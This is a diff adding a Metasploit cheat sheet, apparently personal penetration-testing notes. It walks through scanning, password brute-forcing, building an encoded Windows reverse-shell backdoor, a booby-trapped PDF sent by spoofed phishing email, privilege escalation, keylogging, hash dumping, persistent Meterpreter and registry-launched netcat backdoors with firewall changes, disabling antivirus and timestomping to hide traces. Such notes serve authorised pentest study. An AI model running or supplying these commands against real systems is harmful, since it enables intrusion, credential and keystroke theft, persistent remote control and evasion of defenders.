@@ -1,0 +1,180 @@
+/**
+  * TODO: Pivoting,portfwd, timestomp in depth, MSF extended usage, Metasploit GUIs, PostModule reference, Aux Module reference, recent changes
+/**
+
+
+# Hunting for MSSQL
+search mssql
+use scanner/mssql/mssql_ping
+use scanner/mssql/mssql_login - bruteforce login, altenatively hydra, medusa, Fast-track
+
+# Scanning for Services
+use auxiliary/scanner/ssh/ssh_version
+use auxiliary/scanner/ftp/ftp_version
+-> scan posibilities use auxiliary/scanner/
+
+# Scanning for access with smb_login
+use auxiliary/scanner/smb/smb_login # requires having credentials
+                                    # Very loud. Any successful results can be plugged into the windows/smb/psexec exploit module (exactly like the standalone tool) which can be utilized to create Meterpreter Sessions.
+
+# Vulnerability Scanning with WMAP
+	0. load wmap
+	1. Add host target: wmap_sites -a http://172.16.194.172 # Check them using wmap_sites -l, same for below
+	2. Add targets inside host: wmap_targets -t http://172.16.194.172/mutillidae/index.php
+	3. See modules that will be used to scan: wmap_run -t
+	4. Scan: wmap_run -e
+	5. See vulns: wmap_vulns -l, vulns
+
+# Vulnerability Scanning with NeXpose
+	0. load nexpose
+	1. Log into nexpose server: nexpose_connect user pass host port (default nexpose port 3780)
+	2. Run the scan: nexpose_scan  -c ssh:msfadmin:msfadmin -t full-audit 172.16.194.172
+	3. Run vulns
+
+	Other types of scans:
+		‘nexpose_discover‘ minimal service discovery scan
+		‘nexpose_dos‘ denial of service checking
+		‘nexpose_exhaustive‘ cover all TCP ports and all authorized safe checks.
+
+# Binary Payloads
+Windows reverse shell executable that will connect back to us on port 31337:
+>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.101 LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o /root/Desktop/backdoor.exe
+Now, we will use ‘multi/handler’ a stub that handles exploits launched outside of the framework.
+>use exploit/multi/handler
+we still need to tell it which payload to expect so we configure it to have the same settings as the executable we generated.
+> set payload windows/shell/reverse_tcp # Dont forget to set LHOST and LPORT (example above is 31337)
+now run the exploit and run the executable on the victim.
+
+# Malicious files (PDF in this example)
+>use exploit/windows/fileformat/adobe_utilprintf
+>set FILENAME BestComputers-UpgradeInstructions.pdf
+>set PAYLOAD windows/meterpreter/reverse_tcp # Set lhost & lport, 4455 for eg.
+we need to set up a listener to capture this reverse connection
+>use exploit/multi/handler
+>set PAYLOAD windows/meterpreter/reverse_tcp # Set lhost & lport, the same as set above
+S.E.: > sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
+Victim runs the pdf, we get the connection now we need to move the process:
+> run post/windows/manage/migrate -> running ps will give you PIDs to choose a process to move
+Now set up a keylogger:
+>sysinfo
+>use priv
+>run post/windows/capture/keylog_recorder 
+results:
+>cat /root/.msf4/loot/20110323091836_default_192.168.1.195_host.windows.key_832155.txt
+
+# Privilege escalation
+use exploit/windows/browser/ms10_002_aurora
+use priv
+meterpreter > getsystem
+if Access is denied, background session and try other exploits, eg:
+use exploit/windows/local/ms10_015_kitrap0d ; set PAYLOAD windows/meterpreter/reverse_tcp
+
+# VNC Authentication
+use auxiliary/scanner/vnc/vnc_none_auth # Search a range, set multiple threads to make it faster
+
+# Password sniffing
+-> similar to dsniff (https://docs.oseems.com/general/operatingsystem/linux/sniff-network-traffic)
+-> supports pop3, imap, ftp, and HTTP GET. 
+-> can process pcap files
+use auxiliary/sniffer/psnuffle
+
+# Meterpreter Backdoor
+meterpreter > run metsvc
+We set all of our options for ‘metsvc_bind_tcp’ with the victim’s IP address and the port we wish to have the service connect to on our machine. We then run the exploit.
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/metsvc_bind_tcp
+-> Making it persistent
+We will configure our persistent Meterpreter session to wait until a user logs on to the remote system and try to connect back to our listener every 5 seconds at IP address 192.168.1.71 on port 443.
+meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
+
+# Persistent Netcat Backdoor
+upload a copy of netcat to the remote system.
+meterpreter > upload /pentest/windows-binaries/tools/nc.exe C:\\windows\\system32
+work with the registry to have netcat execute on start up and listen on port 445
+meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+double check: 
+meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+alter the system to allow remote connections through the firewall to our netcat backdoor
+execute -f cmd -i
+netsh firewall show opmode
+netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
+doublecheck:
+netsh firewall show portopening
+to connect: nc -v 172.16.104.128 445 # v for verbose
+
+# Enabling Remote Desktop
+‘getgui’ which enables Remote Desktop and creates a user account for you to log into it with
+meterpreter > run getgui -u loneferret -p password
+kali > rdesktop -u loneferret -p password 192.168.1.123
+when you're done run the cleanup script
+meterpreter > run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20110112.2448.rc
+
+# Useful post-exploitation tools.
+post/linux/gather/hashdump
+post/linux/gather/checkvm
+post/linux/gather/enum_configs
+post/linux/gather/enum_network
+post/linux/gather/enum_protections
+post/linux/gather/enum_system
+post/linux/gather/enum_users_history
+
+# Meterpreter existing scripts
+checkvm
+getcountermeasure
+getgui
+get_local_subnets
+gettelnet
+hostsedit
+killav
+remotewinenum
+scraper
+winenum
+
+# Meterpreter Useful API Calls
+irb
+client.sys.config.sysinfo
+client.sys.config.sysinfo.class
+client.sys.config.sysinfo['OS']
+client.sys.config.getuid
+client.sys.process.getpid
+client.net.config.interfaces
+client.net.config.interfaces.class
+
+# John the Ripper -> find trivial passwords in a short amount of time
+OPT: gather hashes from a session: use post/windows/gather/hashdump
+msf > use auxiliary/analyze/jtr_crack_fast
+msf auxiliary(jtr_crack_fast) > show actions
+            ...actions...
+msf auxiliary(jtr_crack_fast) > set ACTION <action-name>
+msf auxiliary(jtr_crack_fast) > show options
+            ...show and set options...
+msf auxiliary(jtr_crack_fast) > run
+
+# Keylogging
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+to capture system login information just migrate to the winlogon process
+
+# Searching for Content
+meterpreter > search -h
+
+# Clean your footprints
+meterpreter > timestomp -h
+
+# SNMP Sweeping
+https://www.offensive-security.com/metasploit-unleashed/snmp-scan/
+
+# Enumerating Installed Windows Patches
+https://www.offensive-security.com/metasploit-unleashed/patch-enumeration/
+
+# Screen capture
+meterpreter> use espia
+meterpreter> screengrab <- e sure that the process your meterpreter is on has access to active desktops or this will not work.
+
+# Packet Sniffing in meterpreter
+meterpreter > use sniffer
+or
+meterpreter > run packetrecorder
+
+* Our metasploit scripts go under  /usr/share/metasploit-framework/scripts/meterpreter/
